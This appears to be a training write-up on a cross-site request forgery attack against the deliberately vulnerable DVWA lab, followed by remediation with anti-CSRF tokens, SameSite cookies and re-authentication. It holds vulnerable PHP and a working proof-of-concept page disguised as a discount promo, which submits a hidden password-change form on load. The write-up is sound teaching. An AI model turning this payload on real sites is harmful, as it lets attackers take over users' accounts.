# Cross-Site Request Forgery (CSRF) Assessment & Remediation

**Internship Program:** Cybersecurity & Ethical Hacking (ApexPlanet)  
**Task Module:** Task 3 – Web Application Security  
**Target Application:** Damn Vulnerable Web Application (DVWA)  
**Security Level:** Low  
**Vulnerability Classification:** CWE-352 / OWASP Top 10 A01:2021 – Broken Access Control  

---

## 1. Vulnerability Overview
Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated victim's web browser to execute unauthorized state-changing actions on a trusted web application where the user is currently authenticated.

* **Target URL:** `http://127.0.0.1/DVWA/vulnerabilities/csrf/`
* **Target Operation:** Modifying user passwords without re-authentication or token verification.

---

## 2. Insecure Source Code (Root Cause Analysis)
The application accepts password updates via HTTP `GET` requests without validating origin headers (`Origin`/`Referer`) or implementing unique anti-CSRF request tokens:

```php
// Insecure CSRF Implementation (DVWA Low Level)
if (isset($_GET['Change'])) {
    $pass_new  =$_GET['password_new'];
    $pass_conf =$_GET['password_conf'];

    if ($pass_new === $pass_conf) {$query  = "UPDATE users SET password = '" . md5($pass_new) . "' WHERE user = '$user';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    }
}
```
### 3. Exploit Proof-of-Concept (`csrf_poc.html`)
An attacker hosts a malicious web page containing an auto-submitting hidden form targeting the vulnerable password endpoint:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Exclusive Promo Claim</title>
</head>
<body>
  <h2>Claiming your free discount code...</h2>
  <form id="csrfForm" action="[http://127.0.0.1/DVWA/vulnerabilities/csrf/](http://127.0.0.1/DVWA/vulnerabilities/csrf/)" method="GET">
    <input type="hidden" name="password_new" value="apex123" />
    <input type="hidden" name="password_conf" value="apex123" />
    <input type="hidden" name="Change" value="Change" />
  </form>
  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```
## 4. Exploitation Lifecycle & Proof of Concept
* **Step 1 (Active Session):** The victim logs into DVWA, establishing a valid session cookie (`PHPSESSID`).

* **Step 2 (Phishing / Delivery):** In the same browser, the victim navigates to `csrf_poc.html.`

* **Step 3 (Automatic Execution):** The embedded script automatically triggers the GET request to `127.0.0.1/DVWA/vulnerabilities/csrf/.`

* **Step 4 (Unauthorized State Change):** The victim's browser automatically attaches their session credentials, and the DVWA server updates the account password to `apex123`.

**Figure 4.1:** Password successfully changed via forged GET request from external proof-of-concept page.
## 5. Remediation & Defense-in-Depth
**5.1 Anti-CSRF Synchronizer Tokens (Primary Defense)**
Generate a unique, cryptographically random, unpredictable token per session, and validate it upon every state-changing request (`POST`/`PUT`/`DELETE`):
```php
<?php
// Generate Anti-CSRF Token
if (empty($_SESSION['csrf_token'])) {$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validate Token upon POST Request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'],$_POST['csrf_token'])) {
        http_response_code(403);
        die('CSRF token validation failed.');
    }
}
?>
```

**5.2 Cookie Hardening (SameSite Attribute)**
Configure session cookies with the `SameSite=Strict` attribute to prevent the browser from attaching cookies on cross-origin requests:
```php
; php.ini secure cookie configuration
session.cookie_samesite = "Strict"
session.cookie_httponly = 1
session.cookie_secure = 1
```
## 5.3 Re-Authentication for Sensitive Actions
Require the user to supply their current password before allowing password updates or email changes.
